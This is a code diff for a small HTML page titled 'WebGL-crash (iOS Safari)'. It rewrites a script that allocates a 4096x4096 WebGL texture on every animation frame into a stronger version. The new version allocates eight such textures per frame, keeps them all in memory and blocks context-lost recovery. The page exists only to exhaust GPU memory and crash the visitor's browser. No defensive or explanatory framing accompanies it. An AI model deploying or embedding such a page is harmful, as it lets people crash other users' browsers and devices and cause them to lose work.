@@ -1,15 +1,55 @@
-<!doctype html>
-<meta charset=utf-8>
-<title>WebGL‑crash</title>
-<canvas id=c></canvas>
-<script>
-const gl=c.getContext('webgl',{preserveDrawingBuffer:true});
-c.width=window.innerWidth;c.height=window.innerHeight;
-function spam(){
- const t=gl.createTexture();
- gl.bindTexture(gl.TEXTURE_2D,t);
- gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,4096,4096,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
- requestAnimationFrame(spam);
-}
-spam();
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>WebGL‑crash (iOS Safari)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+    }
+    canvas {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+  </style>
+</head>
+
+<body>
+  <canvas id="c"></canvas>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const canvas = document.getElementById('c');
+      const gl = canvas.getContext('webgl', { preserveDrawingBuffer: true });
+      if (!gl) { return; }
+
+      function resize() {
+        canvas.width  = window.innerWidth;
+        canvas.height = window.innerHeight;
+        gl.viewport(0, 0, canvas.width, canvas.height);
+      }
+      resize();
+      window.addEventListener('resize', resize);
+
+      canvas.addEventListener('webglcontextlost', function (e) { e.preventDefault(); });
+
+      const textures = [];
+      function spam() {
+        for (let i = 0; i < 8; i += 1) {
+          const tex = gl.createTexture();
+          gl.bindTexture(gl.TEXTURE_2D, tex);
+          gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+          textures.push(tex);
+        }
+        requestAnimationFrame(spam);
+      }
+      spam();
+    });
+  </script>
+</body>
+</html>
